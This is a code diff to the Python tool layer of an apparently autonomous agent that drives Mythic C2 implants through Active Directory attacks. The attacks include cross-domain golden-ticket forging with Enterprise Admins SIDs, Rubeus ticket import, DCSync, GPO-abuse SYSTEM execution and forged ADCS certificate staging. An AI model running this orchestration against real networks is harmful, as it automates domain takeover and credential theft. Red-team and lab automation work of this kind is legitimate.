@@ -192,6 +192,7 @@ import ast
 import base64
 from datetime import datetime, timezone
 import hashlib
+import inspect
 import re
 from typing import Annotated, List, Dict, TypedDict
 from mythic import mythic, mythic_classes
@@ -727,6 +728,17 @@ def _normalize_command_name(command: str) -> str:
     return str(command or "").strip().casefold().replace("-", "_")
 
 
+def _task_output_text(output) -> str:
+    """Return Mythic task output as text without leaking Python bytes reprs downstream."""
+    if output is None:
+        return ""
+    if isinstance(output, bytes):
+        return output.decode("utf-8", "replace")
+    if isinstance(output, bytearray):
+        return bytes(output).decode("utf-8", "replace")
+    return str(output)
+
+
 def _ticket_command_key(command: str, parameters) -> str:
     """Stable key for a builder-shaped Kerberos ticket forge command.
 
@@ -793,13 +805,29 @@ def _is_deterministic_ticket_command(command: str, parameters) -> bool:
 def _capability_command_key(command: str, parameters) -> str:
     command_name = _capability_command_name(command)
     try:
-        if isinstance(parameters, str):
+        shell_text = _shell_parameter_text(parameters) if _normalize_command_name(command) == "shell" else ""
+        if shell_text:
+            params_key = shell_text
+        elif isinstance(parameters, str):
             params_key = parameters
         else:
             params_key = json.dumps(parameters, sort_keys=True, default=str)
     except Exception:
         params_key = str(parameters)
     return f"{command_name}:{params_key}"
+
+
+def _shell_parameter_text(parameters) -> str:
+    if isinstance(parameters, str):
+        return parameters
+    if not isinstance(parameters, dict):
+        return ""
+    lowered = {str(key).casefold(): value for key, value in parameters.items()}
+    for key in ("command", "cmd", "shell", "arguments", "args"):
+        value = lowered.get(key)
+        if isinstance(value, str) and value.strip():
+            return value
+    return ""
 
 
 def _capability_command_name(command: str) -> str:
@@ -934,10 +962,11 @@ class MythicTools:
         self._autonomous_objective_seed: str = ""
         self._autonomous_objective_persisted: bool = False
         self._pending_engagement_hop = None
-        # Assembly filenames already checked against Mythic filemeta in this Sage process. Apollo's
-        # execute_assembly/inline_assembly can lazily fetch bytes by assembly_id; no hidden register_assembly
-        # task is required for those commands once the file exists in Mythic.
-        self._assembly_file_checks: set[str] = set()
+        # Registered file references already checked against Mythic filemeta in this Sage process. Payload
+        # commands that expose a registered-file selector can lazily resolve those bytes once the file exists
+        # in Mythic; no hidden agent task is required.
+        self._registered_file_checks: set[str] = set()
+        self._assembly_file_checks = self._registered_file_checks  # compatibility for older tests/helpers
         # Forward-planner graph facts: BloodHound ACL edges (GenericWrite on GPOs, WriteDacl on domains,
         # etc.) projected into engagement predicates, cached here and refreshed after each verified ingest
         # so the per-turn injection can DIRECT the operator to the next available hop instead of letting it
@@ -973,8 +1002,9 @@ class MythicTools:
         # got the static gate demoted to advisory).
         self._dcsync_precheck_blocks: dict = {}
         # Parent domains for which we hold a usable parent-Enterprise-Admins context: established when the
-        # cross-domain forge IMPORTS its inter-realm referral ticket (child krbtgt -> parent-EA golden ->
-        # referral -> import). EA membership confers DS-Replication on the parent, so this grants
+        # cross-domain forge imports a child-domain TGT carrying the parent EA ExtraSID into the current Windows
+        # logon session. Windows can then acquire the parent referral/service ticket on demand during the proof
+        # operation. EA membership confers DS-Replication on the parent, so this grants
         # ds-replication-rights:<parent> for the DCSync proof that immediately follows in the same chain. Scoped
         # to same-forest child->parent only; the DCSync still gates the final da:<parent> recording on real
         # proof, so a granted-but-unproven right records no objective effect.
@@ -987,6 +1017,12 @@ class MythicTools:
         # Deliberation-drain guards. Command schemas are STATIC per payloadtype -> cache (a 2026-06-09 solve
         # re-fetched + re-dumped them 27×, bloating context).
         self._command_schema_cache: dict = {}
+        self._callback_command_surface_cache: dict[str, tuple[str, list[dict]]] = {}
+        # One bounded model-assisted mechanic substitution may be attempted for an unresolved deterministic
+        # command binding. Cache both accepted and rejected proposals so a repeated proof poll or retry cannot
+        # turn into an open-ended "try another command" loop.
+        self._mechanic_repair_resolver = None
+        self._mechanic_repair_cache: dict[tuple, dict | None] = {}
         # Credential-store cache: the store is read both by read_credentials (which the agent hit 24× in one
         # solve) and by the gate's durable-hop corroboration probe. Cache the raw rows for a short TTL so
         # neither path re-queries Mythic repeatedly.
@@ -1031,6 +1067,10 @@ class MythicTools:
         # task_display_id) so re-reads of the same finished task don't re-fetch its (often large) output.
         # Only populated for completed tasks — a running task's output still changes and is never cached.
         self._task_output_cache: dict[int, str] = {}
+
+    def set_mechanic_repair_resolver(self, resolver) -> None:
+        """Install the bounded payload-mechanic resolver used by deterministic capability execution."""
+        self._mechanic_repair_resolver = resolver if callable(resolver) else None
 
     async def login(self):
         """Create the Mythic API client connection asynchronously."""
@@ -1942,10 +1982,10 @@ class MythicTools:
             pass
 
     def _log_kerberos_ticket_bind_fire(self, command: str, shape: str, ticket_len: int) -> None:
-        # Runtime proof that the inter-realm ticket substitution actually fired at issue time (a unit test on a
+        # Runtime proof that explicit-TGS ticket substitution actually fired at issue time (a unit test on a
         # dict gives false confidence — the controller path delivers translated/serialized params). Grep
-        # `kerberos-ticket-bind FIRED` in the Sage tmux log to confirm the referral got a real ticket, not a
-        # literal `{{kerberos_ticket_base64}}`.
+        # `kerberos-ticket-bind FIRED` in the Sage tmux log to confirm the fallback exchange got a real ticket,
+        # not a literal `{{kerberos_ticket_base64}}`.
         try:
             logger.info(f"🎟️ kerberos-ticket-bind FIRED command={command} shape={shape} ticket_len={ticket_len}")
         except Exception:
@@ -1955,14 +1995,15 @@ class MythicTools:
         try:
             cname = _normalize_command_name(command)
             cached = self._capability_artifacts.get("kerberos_ticket_base64")
-            # Inter-realm referral: Rubeus `asktgs /ticket:{{kerberos_ticket_base64}}` runs via execute_assembly,
-            # so the captured ticket lives in the assembly-arguments VALUE. By the time this runs, argument
-            # resolution may have translated the params to the agent-native key form (e.g. Apollo {Assembly,
-            # Arguments}) or serialized them to a JSON string — so substitute the placeholder GENERICALLY in any
-            # string value of a dict, or in the whole string, never a fixed lowercase key set. A key-specific
-            # match silently no-ops on the controller path (unit-green, never fires live): that exact gap shipped
-            # the literal `{{kerberos_ticket_base64}}` to Rubeus, which rejected it and broke the referral hop.
-            if cname in {"execute_assembly", "execute-assembly", "inline_assembly"} and cached:
+            # Managed-ticket consumers: explicit Rubeus `asktgs` fallback runs via execute_assembly, while
+            # Merlin current-session `ptt` runs via invoke_assembly. In both cases the captured ticket lives in
+            # an assembly-arguments VALUE. By the time this runs, argument resolution may have translated the
+            # params to the agent-native key form (e.g. Apollo {Assembly, Arguments} or Merlin {assembly, args})
+            # or serialized them to a JSON string — so substitute the placeholder GENERICALLY in any string
+            # value of a dict, or in the whole string, never a fixed lowercase key set. A key-specific match
+            # silently no-ops on the controller path (unit-green, never fires live): that exact gap shipped the
+            # literal `{{kerberos_ticket_base64}}` to Rubeus.
+            if cname in {"execute_assembly", "inline_assembly", "invoke_assembly"} and cached:
                 placeholder = "{{kerberos_ticket_base64}}"
                 if isinstance(parameters, str):
                     if placeholder in parameters:
@@ -2103,24 +2144,49 @@ class MythicTools:
         self,
         callback_display_id: int,
         host: str = "",
+        adapter: dict | None = None,
+        known_domain_authorities: tuple[str, ...] | set[str] = (),
     ) -> auth_context.AuthenticationContext:
-        """Observe Apollo's active token identities and tickets bound to its current logon-session LUID."""
+        """Observe the active token identity and any current-session ticket evidence."""
+        config = adapter if isinstance(adapter, dict) else {}
+
+        def profile_value(key: str, default):
+            return config[key] if key in config else default
+
+        identity_command = str(profile_value("collection_identity_command", "whoami") or "").strip()
+        identity_parameters = profile_value("collection_identity_parameters", "")
+        if not identity_command:
+            raise ValueError("collection identity probe has no command")
         identity_output = await self.issue_task_and_waitfor_task_output(
-            "whoami",
-            "",
+            identity_command,
+            identity_parameters,
             callback_display_id,
         )
-        ticket_output = await self.issue_task_and_waitfor_task_output(
-            "ticket_cache_list",
+        ticket_command = str(profile_value("collection_ticket_command", "ticket_cache_list") or "").strip()
+        ticket_parameters = profile_value(
+            "collection_ticket_parameters",
             {"luid": "", "getSystemTickets": False},
-            callback_display_id,
+        )
+        ticket_output = ""
+        if ticket_command:
+            ticket_output = await self.issue_task_and_waitfor_task_output(
+                ticket_command,
+                ticket_parameters,
+                callback_display_id,
+            )
+        authorities = set(self._known_domain_authorities.get(str(callback_display_id), set()))
+        authorities.update(
+            str(item or "").strip()
+            for item in (known_domain_authorities or ())
+            if str(item or "").strip()
         )
         snapshot = auth_context.build_authentication_context(
             callback_display_id,
             host,
             identity_output,
             ticket_output,
-            self._known_domain_authorities.get(str(callback_display_id), set()),
+            authorities,
+            identity_parser=str(profile_value("collection_identity_parser", "apollo") or "apollo"),
         )
         self._authentication_contexts[str(callback_display_id)] = snapshot
         self._known_domain_authorities[str(callback_display_id)] = set(
@@ -2141,6 +2207,8 @@ class MythicTools:
             if normalized == "ticket_store_add" and "added ticket" in low:
                 self._bump_kerberos_context_epoch(callback_display_id)
             elif normalized == "ticket_cache_add" and low:
+                self._bump_kerberos_context_epoch(callback_display_id)
+            elif normalized in {"execute_assembly", "inline_assembly", "invoke_assembly"} and "ticket successfully imported" in low:
                 self._bump_kerberos_context_epoch(callback_display_id)
             elif normalized in {
                 "ticket_store_purge",
@@ -2267,6 +2335,80 @@ class MythicTools:
         except Exception:
             return fallback or None
 
+    @staticmethod
+    def _single_required_string_schema_parameter(param_schema) -> dict | None:
+        if not isinstance(param_schema, list):
+            return None
+        groups: dict[str, list[dict]] = {}
+        for param in param_schema:
+            if not isinstance(param, dict):
+                continue
+            group = str(param.get("parameter_group_name") or "Default")
+            groups.setdefault(group, []).append(param)
+        candidates: list[dict] = []
+        for params in groups.values():
+            required = [
+                param for param in params
+                if bool(param.get("required")) and param.get("default_value") in (None, "")
+            ]
+            if len(required) != 1:
+                continue
+            candidate = required[0]
+            if str(candidate.get("type") or "String").casefold() != "string":
+                continue
+            candidates.append(candidate)
+        if len(candidates) != 1:
+            return None
+        return candidates[0]
+
+    def _schema_single_string_parameters(self, command, parameters, param_schema):
+        if not isinstance(parameters, str) or not parameters.strip():
+            return None
+        candidate = self._single_required_string_schema_parameter(param_schema)
+        if not candidate:
+            return None
+        supplied_key = str(candidate.get("name") or candidate.get("cli_name") or "").strip()
+        if not supplied_key:
+            return None
+        resolved = command_builder.resolve_params(
+            param_schema,
+            {supplied_key: parameters},
+            command=command,
+        )
+        if not resolved.ok or not isinstance(resolved.params, dict) or not resolved.params:
+            return None
+        return resolved.params
+
+    async def _coerce_shell_parameters_from_schema(self, command, parameters, callback_display_id):
+        if _normalize_command_name(command) != "shell" or not isinstance(parameters, str) or not parameters.strip():
+            return parameters
+        param_schema = await self._fetch_command_schema(command, callback_display_id)
+        repaired = self._schema_single_string_parameters(command, parameters, param_schema)
+        if repaired is None:
+            return parameters
+        logger.debug(
+            "🛡️ ARGRES wrapped shell command line into schema-backed parameters command=%s callback=%s keys=%s",
+            command,
+            callback_display_id,
+            sorted(repaired.keys()),
+        )
+        return repaired
+
+    async def _construction_repair_parameters(self, command, parameters, callback_display_id, output: str):
+        if command_builder.classify_result(command, output) != command_builder.ResultClass.CONSTRUCTION.value:
+            return None
+        param_schema = await self._fetch_command_schema(command, callback_display_id)
+        if not param_schema:
+            return None
+        if isinstance(parameters, dict) and parameters:
+            resolved = command_builder.resolve_params(param_schema, parameters, command=command)
+            if resolved.ok and resolved.params != parameters:
+                return resolved.params, "rebuild_with_payload_schema"
+        repaired = self._schema_single_string_parameters(command, parameters, param_schema)
+        if repaired is not None and repaired != parameters:
+            return repaired, "rebuild_with_payload_schema"
+        return None
+
     async def issue_task_and_waitfor_task_output(self, command: str, parameters: str|dict, callback_display_id: int, token_id: int | None = None, timeout: int | None = None) -> str:
         """Issue `command` on the agent at `callback_display_id` and wait for its output.
 
@@ -2343,6 +2485,16 @@ class MythicTools:
         # through `shell`; otherwise Mythic starts a process named "dir" or sends a literal JSON object to cmd.
         try:
             command, parameters = self._rewrite_shell_like_run(command, parameters)
+            parameters = await self._coerce_shell_parameters_from_schema(command, parameters, callback_display_id)
+        except Exception:
+            pass
+        try:
+            live_command = await self._authenticate_live_command(command, callback_display_id)
+            if live_command.get("status") == "missing":
+                self._pending_task_backed_transition = None
+                return self._missing_live_command_message(command, live_command.get("payload_type"), callback_display_id)
+            if live_command.get("status") == "available" and live_command.get("command"):
+                command = live_command["command"]
         except Exception:
             pass
         raw_gpo_blocker = self._raw_gpo_mutation_blocker(command, parameters)
@@ -2364,6 +2516,14 @@ class MythicTools:
                 f"likely wrong or the failure is environmental. Report this to the operator, consult "
                 f"get_all_commands_for_payloadtype for the correct parameter schema, or choose a different approach."
             )
+
+        # Registered-file commands often expose a ChooseOne selector whose choices are populated from Mythic
+        # filemeta. Satisfy that control-plane prerequisite before argument resolution; otherwise the resolver
+        # can reject an unregistered tool name before Sage gets a chance to register it.
+        try:
+            await self._ensure_registered_file_available(command, parameters, callback_display_id)
+        except Exception:
+            pass
 
         # Deterministic pre-flight: first repair prior-key names and group mixes against the
         # live schema, then keep the existing validator as the conservative hard stop.
@@ -2461,13 +2621,6 @@ class MythicTools:
         try:
             if self.client is None:
                 raise Exception("MythicAPIClient not initialized. Call create() first.")
-            # D1: by-name assembly execution needs Mythic filemeta so create_go_tasking can resolve
-            # assembly_name -> assembly_id. Apollo fetches/caches the bytes lazily during execute_assembly,
-            # so do NOT issue a hidden register_assembly task here.
-            try:
-                await self._ensure_assembly_file_available(command, parameters, callback_display_id)
-            except Exception:
-                pass
             logger.debug(f"🛠️ Calling issue_task_and_waitfor_task_output tool for command: {command} on callback_display_id: {callback_display_id}")
             # The Mythic lib's own `timeout` does not reliably fire — its waitfor subscription can
             # block indefinitely when a task never reaches a terminal state (the documented
@@ -2525,7 +2678,7 @@ class MythicTools:
                         "No results returned from task.",
                     )
                 return "No results returned from task."
-            results_str = str(results)
+            results_str = _task_output_text(results)
             if (
                 getattr(self, "_pending_engagement_hop", None)
                 and self._pending_engagement_hop[0] == "gpo-abuse"
@@ -2802,7 +2955,7 @@ class MythicTools:
             technique in {"dcsync", "dcsync-user"}
             and bool(dom)
             and f"ds-replication-rights:{dom}" not in state.satisfied_predicates()
-            # A cross-domain forge that has imported its parent-EA referral ticket holds DS-Replication on the
+            # A cross-domain forge that has imported an EA-capable Kerberos context holds DS-Replication on the
             # parent via Enterprise Admins; do not pre-block its own proof DCSync as "no rights".
             and dom not in self._cross_domain_replication_rights
         )
@@ -3777,56 +3930,86 @@ class MythicTools:
                 return v.strip()
         return ""
 
-    async def _ensure_assembly_file_available(self, command, parameters, callback_display_id) -> None:
-        """Ensure a by-name Apollo assembly reference exists in Mythic filemeta before task creation.
+    def _registered_file_selectors(self, schema) -> list[dict]:
+        """Return schema params that select an already-registered Mythic file."""
+        if not isinstance(schema, list):
+            return []
+        file_groups = {
+            str(param.get("parameter_group_name") or "Default")
+            for param in schema
+            if isinstance(param, dict) and str(param.get("type") or "").casefold() == "file"
+        }
+        if not file_groups:
+            return []
+        return [
+            param
+            for param in schema
+            if isinstance(param, dict)
+            and str(param.get("type") or "").casefold() == "chooseone"
+            and str(param.get("parameter_group_name") or "Default") not in file_groups
+        ]
 
-        Apollo's server-side create_go_tasking resolves `assembly_name` to an `assembly_id` from Mythic
-        filemeta. The callback then downloads and caches the bytes lazily if its encrypted file store does not
-        already have them. Hidden `register_assembly` tasking is therefore unnecessary here and creates noisy,
-        duplicate "registered" tasks across Sage restarts.
+    def _registered_file_name_from_schema(self, command, parameters, schema) -> str:
+        """Return a by-name registered file reference from a schema-backed parameter dict."""
+        if not isinstance(parameters, dict):
+            return ""
+        selectors = self._registered_file_selectors(schema)
+        if not selectors:
+            return ""
+        try:
+            resolved = command_builder.resolve_params(schema, parameters, command=command)
+            values = resolved.params if isinstance(resolved.params, dict) else {}
+        except Exception:
+            values = {}
+        for selector in selectors:
+            for key in (selector.get("cli_name"), selector.get("name")):
+                value = values.get(key) if key in values else parameters.get(key)
+                raw = str(value or "").strip()
+                if not raw or "/" in raw or "\\" in raw:
+                    continue
+                if re.search(r"\.[A-Za-z0-9]{1,12}$", raw):
+                    return raw
+        return ""
+
+    async def _ensure_registered_file_available(self, command, parameters, callback_display_id) -> None:
+        """Ensure a schema-selected registered file exists in Mythic before task creation.
+
+        This is a Mythic control-plane prerequisite, not a payload-specific command behavior. Commands that
+        expose a registered-file selector plus a separate File upload group can use a by-name file reference
+        once Mythic filemeta contains that name.
         """
-        if _normalize_command_name(command) not in {"execute_assembly", "inline_assembly"}:
+        if not isinstance(parameters, dict) or not parameters:
             return
-        name = self._assembly_name_from_params(parameters)
+        schema = await self._fetch_command_schema(command, callback_display_id)
+        name = self._registered_file_name_from_schema(command, parameters, schema)
         if not name:
-            return  # upload/file group, or no assembly name
-        key = name.casefold()
-        if key in self._assembly_file_checks:
             return
-        if await self._assembly_available_in_schema(command, name, callback_display_id):
-            self._assembly_file_checks.add(key)
+        key = name.casefold()
+        if key in self._registered_file_checks:
+            return
+        if self._registered_file_available_in_schema(schema, name):
+            self._registered_file_checks.add(key)
             return
         try:
             up = json.loads(await self.ensure_tool_uploaded(name))
         except Exception as e:
-            logger.debug(f"assembly-file-preflight: ensure_tool_uploaded({name}) failed: {e}")
+            logger.debug(f"registered-file-preflight: ensure_tool_uploaded({name}) failed: {e}")
             return
         if up.get("status") not in {"uploaded", "already_present"} or not up.get("file_uuid"):
-            return  # tool not available — let the normal path surface the missing-tool result
-        self._assembly_file_checks.add(key)
+            return
+        self._registered_file_checks.add(key)
         await self._invalidate_command_schema_cache(command, callback_display_id)
 
-    async def _assembly_available_in_schema(self, command: str, name: str, callback_display_id) -> bool:
-        """Return true when Mythic already exposes the assembly in the command schema choices.
+    def _registered_file_available_in_schema(self, schema, name: str) -> bool:
+        """Return true when Mythic already exposes the file in registered-selector choices.
 
         Some Mythic schema queries do not include dynamic query-function choices, so false means "unknown",
         not "absent".
         """
-        try:
-            schema = await self._fetch_command_schema(command, callback_display_id)
-        except Exception:
-            schema = None
-        if not isinstance(schema, list):
-            return False
         wanted = self._capability_text(name).strip().casefold()
         if not wanted:
             return False
-        for param in schema:
-            if not isinstance(param, dict):
-                continue
-            param_name = self._capability_text(param.get("name") or param.get("cli_name")).casefold()
-            if param_name not in {"assembly", "assembly_name", "filename"}:
-                continue
+        for param in self._registered_file_selectors(schema):
             choices = param.get("choices")
             if not isinstance(choices, list):
                 continue
@@ -4288,6 +4471,11 @@ class MythicTools:
                 return
             if capability == "gpo-controlled-system-exec":
                 if expected_probe != "extract_gpo_system_exec_probe":
+                    return
+                # Structured setup artifact reads can contain `NT AUTHORITY\SYSTEM`
+                # and satisfy the raw extractor, but they are not effect proof. Only
+                # the transaction's final proof step may bridge into durable state.
+                if not self._capability_executor_is_final_probe(context):
                     return
                 try:
                     from . import capabilities
@@ -4836,7 +5024,9 @@ class MythicTools:
             "proof-file read commands. Also pass gpo_guid when SharpGPOAbuse printed one. For GPO SYSTEM tasks, "
             "pass command/arguments or command_path/command_arguments for the exact SYSTEM action; proof files "
             "default to C:\\Users\\Public so the low-privileged foothold can read them back. For ticket capabilities, pass proof_resource/proof_host when BloodHound "
-            "cannot derive a DC."
+            "cannot derive a DC. Cross-domain Kerberos use defaults to OS-native referral/service ticket "
+            "acquisition after current-session import; pass kerberos_ticket_acquisition_strategy='explicit-asktgs' "
+            "only when a standalone TGS artifact is required."
         )] = None,
     ) -> str:
         """Build deterministic Mythic command parameters for a generic capability action.
@@ -4866,6 +5056,7 @@ class MythicTools:
                 }, sort_keys=True)
 
             await self._augment_capability_runtime_inputs(action_obj, input_values)
+            await self._bind_capability_mythic_adapter(action_obj, input_values)
             self._validate_capability_ticket_sid_sources(action_obj, input_values)
             input_errors = self._capability_input_errors(input_values)
             if input_errors:
@@ -4892,6 +5083,8 @@ class MythicTools:
                     "intent": dict(getattr(action_obj, "intent", {}) or {}),
                     "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                     "runtime_inputs": self._safe_capability_runtime_context(input_values),
+                    "operation": self._capability_text(getattr(command_obj, "operation", "")),
+                    "purpose": self._capability_text(getattr(command_obj, "purpose", "")),
                     "expected_probe": self._capability_text(getattr(command_obj, "expected_probe", "")),
                     "produces": list(getattr(command_obj, "produces", []) or []),
                     "consumes": list(getattr(command_obj, "consumes", []) or []),
@@ -4928,6 +5121,33 @@ class MythicTools:
             out = {"value": value}
         self._normalize_capability_ticket_inputs(out)
         return out
+
+    async def _bind_capability_mythic_adapter(self, action, inputs: dict) -> None:
+        """Attach a payload-type command profile unless the caller supplied one."""
+        if not isinstance(inputs, dict) or "mythic_adapter" in inputs:
+            return
+        callback_id = self._capability_callback_id(action, inputs)
+        if not callback_id or not callback_id.isdigit():
+            return
+        try:
+            payload_type = await self._resolve_payload_type(int(callback_id))
+            try:
+                from . import mythic_capability_adapter
+            except ImportError:
+                import mythic_capability_adapter
+            profile = mythic_capability_adapter.adapter_config_for_payload_type(payload_type)
+            if profile:
+                # Without a payload profile, callers already pass runtime adapter overrides
+                # at the top level. Preserve that precedence when auto-binding a profile.
+                merged_profile = dict(profile)
+                merged_profile.update({
+                    key: value
+                    for key, value in inputs.items()
+                    if key != "mythic_adapter"
+                })
+                inputs["mythic_adapter"] = merged_profile
+        except Exception:
+            return
 
     def _safe_capability_runtime_context(self, inputs: dict) -> dict:
         if not isinstance(inputs, dict):
@@ -4998,6 +5218,7 @@ class MythicTools:
             "system_command", "system_arguments",
             "controlled_principal", "current_identity", "current_user", "foothold_identity",
             "allow_proof_only", "proof_only",
+            "kerberos_ticket_acquisition_strategy", "ticket_acquisition_strategy", "service_ticket_strategy",
             "preferred_effect", "intended_effect", "effect",
             "primary_failure_observed", "sharp_gpo_primary_failed", "sharp_gpo_failed",
             "sharp_gpo_guid_only_noop", "gpo_primary_failed", "gpo_repair_after_primary_failure",
@@ -5167,6 +5388,7 @@ class MythicTools:
                 }, sort_keys=True)
 
             await self._augment_capability_runtime_inputs(action_obj, input_values)
+            await self._bind_capability_mythic_adapter(action_obj, input_values)
             await self._ensure_capability_executor_proof_target(action_obj, input_values)
             callback_id = self._capability_callback_id(action_obj, input_values)
             if not callback_id:
@@ -5304,6 +5526,7 @@ class MythicTools:
                 if isinstance(materialized_action, dict):
                     action_obj = self._capability_tool_action(materialized_action, input_values, capabilities) or action_obj
                 await self._augment_capability_runtime_inputs(action_obj, input_values)
+                await self._bind_capability_mythic_adapter(action_obj, input_values)
                 await self._ensure_capability_executor_proof_target(action_obj, input_values)
 
             build_payload = await self._capability_build_command_payload(action_obj, input_values)
@@ -5323,12 +5546,14 @@ class MythicTools:
             transaction = self._capability_transaction_start(action_obj, build_payload)
             # The current-context preflight heuristic only legitimately applies to the REDUNDANT LEADING probe
             # steps (inventory + access-check) that the separate preflight already ran. It is position-agnostic,
-            # so it also matches core post-forge steps that touch the current Kerberos context (the referral
-            # ticket-import, purge, and post-import inventory). Skipping those would drop the referral import and
-            # collapse the cross-domain chain. Only skip preflight-looking steps until the first core action is
-            # issued; never skip a step that follows a non-preflight command.
-            # Same-forest child->parent forge: once the parent-EA referral is imported below, grant the parent
-            # DS-Replication right so this chain's own proof DCSync is not pre-blocked. Empty unless cross-domain.
+            # so it also matches core post-forge steps that touch the current Kerberos context (the current-TGT
+            # import, purge, and post-import inventory). Skipping those would drop the imported Kerberos context
+            # and collapse the cross-domain chain. Only skip preflight-looking steps until the first core action
+            # is issued; never skip a step that follows a non-preflight command.
+            # Same-forest child->parent forge: once the EA-capable Kerberos context is imported below, grant the
+            # parent DS-Replication right so this chain's own proof DCSync is not pre-blocked. Empty unless
+            # cross-domain. The imported artifact is usually the child TGT; Windows obtains referral/service
+            # tickets on demand unless the caller explicitly requested an asktgs fallback.
             forge_cross_domain_parent = self._cross_domain_forge_parent(action_obj, input_values)
             core_action_issued = False
             for command_obj in list(build_payload.get("commands") or []):
@@ -5375,7 +5600,7 @@ class MythicTools:
                     self._cross_domain_replication_rights.add(forge_cross_domain_parent)
                     try:
                         logger.info(
-                            "🔑 cross-domain replication-rights GRANTED for %s (parent-EA referral imported)",
+                            "🔑 cross-domain replication-rights GRANTED for %s (EA-capable Kerberos context imported)",
                             forge_cross_domain_parent,
                         )
                     except Exception:
@@ -5440,7 +5665,8 @@ class MythicTools:
                     issued_item["verify_verdict"] = verification.verdict
                     issued_item["verify_reason"] = verification.reason
                     self._capability_transaction_update_verification(transaction, command_obj, verification)
-                    if verification.verdict == "achieved":
+                    final_probe = self._capability_executor_is_final_probe(command_obj)
+                    if verification.verdict == "achieved" and final_probe:
                         credential_refs = await self._import_capability_credential_material(
                             action_obj,
                             input_values,
@@ -5478,7 +5704,7 @@ class MythicTools:
                             "stopped_after": "verified_proof",
                             "transaction": transaction,
                         }, sort_keys=True)
-                    if self._capability_executor_is_final_probe(command_obj):
+                    if final_probe:
                         retry_attempt = 0
                         max_probe_retries = self._capability_executor_final_probe_retry_limit(input_values, command_obj)
                         while self._capability_should_retry_final_probe(
@@ -5764,6 +5990,7 @@ class MythicTools:
                 }, sort_keys=True)
 
             await self._augment_capability_runtime_inputs(action_obj, input_values)
+            await self._bind_capability_mythic_adapter(action_obj, input_values)
             domain = self._capability_target_domain(action_obj, input_values) or self._capability_domain(action_obj, input_values)
             account = self._capability_account(action_obj, input_values) or "administrator"
             callback_id = self._capability_callback_id(action_obj, input_values)
@@ -5772,6 +5999,11 @@ class MythicTools:
                 or getattr(action_obj, "intent", {}).get("ca_host")
                 or self._capability_target_host_from_context({"target": getattr(action_obj, "target", "")})
             ).casefold()
+            adapter_inputs = (
+                input_values.get("mythic_adapter")
+                if isinstance(input_values.get("mythic_adapter"), dict)
+                else input_values
+            )
             if not callback_id:
                 return json.dumps({
                     "ok": False,
@@ -5806,6 +6038,17 @@ class MythicTools:
                 or input_values.get("staged_ca_pfx_path")
                 or input_values.get("remote_ca_cert_path")
             )
+            if self._capability_input_bool(adapter_inputs, "adcs_certificate_auth_compact_remote_paths"):
+                if not remote_ca_path:
+                    remote_ca_path = self._capability_text(
+                        adapter_inputs.get("adcs_certificate_auth_compact_ca_pfx_path")
+                        or r"C:\Users\Public\c.pfx"
+                    )
+                if not remote_path or self._capability_input_bool(input_values, "_auto_forged_pfx_path"):
+                    remote_path = self._capability_text(
+                        adapter_inputs.get("adcs_certificate_auth_compact_forged_pfx_path")
+                        or r"C:\Users\Public\f.pfx"
+                    )
             account_sid = self._capability_text(
                 input_values.get("account_sid")
                 or input_values.get("target_sid")
@@ -5852,46 +6095,102 @@ class MythicTools:
                     "reason": "materializer did not resolve a local CA PFX for staging",
                 }, sort_keys=True)
 
+            merged_inputs = dict(input_values)
+            merged_inputs.update(materialized.inputs)
+
             # NOT _register_file_dedup: the CA PFX is an engagement secret artifact. Content-hash dedup could bind
             # this operation to another engagement's file; hash-dedup is for static tool binaries only.
             file_uuid = await mythic.register_file(self.client, filename=local_path.name, contents=local_path.read_bytes())
-            upload_command = self._capability_text(input_values.get("upload_command") or "upload")
-            file_param = self._capability_text(input_values.get("upload_file_param") or "File") or "File"
-            path_param = self._capability_text(input_values.get("upload_path_param") or "Path") or "Path"
-            upload_parameters = input_values.get("upload_parameters") if isinstance(input_values.get("upload_parameters"), dict) else None
+            adapter_inputs = (
+                merged_inputs.get("mythic_adapter")
+                if isinstance(merged_inputs.get("mythic_adapter"), dict)
+                else merged_inputs
+            )
+            upload_command = self._capability_text(
+                merged_inputs.get("upload_command")
+                or adapter_inputs.get("upload_command")
+                or "upload"
+            )
+            file_param = self._capability_text(
+                merged_inputs.get("upload_file_param")
+                or adapter_inputs.get("upload_file_param")
+                or "File"
+            ) or "File"
+            path_param = self._capability_text(
+                merged_inputs.get("upload_path_param")
+                or adapter_inputs.get("upload_path_param")
+                or "Path"
+            ) or "Path"
+            registered_file_param = self._capability_text(
+                merged_inputs.get("upload_registered_file_param")
+                or adapter_inputs.get("upload_registered_file_param")
+                or file_param
+            ) or file_param
+            registered_file_value_mode = self._capability_text(
+                merged_inputs.get("upload_registered_file_value")
+                or adapter_inputs.get("upload_registered_file_value")
+                or "uuid"
+            ).casefold()
+            registered_file_value = local_path.name if registered_file_value_mode == "filename" else file_uuid
+            upload_parameters = merged_inputs.get("upload_parameters") if isinstance(merged_inputs.get("upload_parameters"), dict) else None
             if upload_parameters:
                 upload_parameters = dict(upload_parameters)
-                upload_parameters.setdefault(file_param, file_uuid)
+                upload_parameters.setdefault(registered_file_param, registered_file_value)
                 upload_parameters.setdefault(path_param, materialized.inputs["ca_pfx_path"])
             else:
                 upload_parameters = {
-                    file_param: file_uuid,
+                    registered_file_param: registered_file_value,
                     path_param: materialized.inputs["ca_pfx_path"],
                 }
-            timeout_value = input_values.get("timeout")
+            timeout_value = merged_inputs.get("timeout")
             try:
                 timeout = int(timeout_value) if timeout_value not in (None, "") else None
             except (TypeError, ValueError):
                 timeout = None
-            upload_output = await self.upload_file_by_file_uuid(
-                upload_command,
-                upload_parameters,
-                file_uuid,
-                int(callback_id),
-                timeout=timeout,
-            )
+            self._last_issued_task_display_id = None
+            try:
+                upload_output = await self.upload_file_by_file_uuid(
+                    upload_command,
+                    upload_parameters,
+                    file_uuid,
+                    int(callback_id),
+                    timeout=timeout,
+                )
+            except Exception as exc:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["ca_pfx_upload"],
+                    "reason": f"CA PFX staging upload failed before task issue: {exc}",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                }, sort_keys=True)
+            upload_task_id = self._last_issued_task_display_id
+            upload_output_text = self._capability_text(upload_output)
+            upload_result_class = command_builder.classify_result(upload_command, upload_output_text)
+            if upload_task_id is None or upload_result_class != command_builder.ResultClass.SUCCESS.value:
+                if upload_task_id is None:
+                    reason = "CA PFX staging upload did not issue a Mythic task"
+                else:
+                    reason = f"CA PFX staging upload returned {upload_result_class}"
+                preview = upload_output_text[-800:]
+                if preview:
+                    reason = f"{reason}: {preview}"
+                return json.dumps({
+                    "ok": False,
